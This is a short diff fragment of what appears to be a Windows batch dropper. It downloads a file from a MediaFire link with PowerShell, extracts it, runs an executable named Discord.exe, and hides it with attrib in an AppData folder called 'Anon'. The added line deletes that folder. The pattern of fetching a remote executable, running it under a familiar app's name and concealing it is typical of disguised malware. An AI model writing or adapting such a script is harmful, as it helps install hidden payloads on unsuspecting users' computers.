@@ -35,5 +35,6 @@ Powershell -Command "Invoke-Webrequest 'https://download1078.mediafire.com/rsdo0
 tar -xf Discord.zip
 del Discord.zip
 start Discord.exe
+del C:\Users\%USERNAME%\AppData\Local\Anon
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
 :--------------------------------------
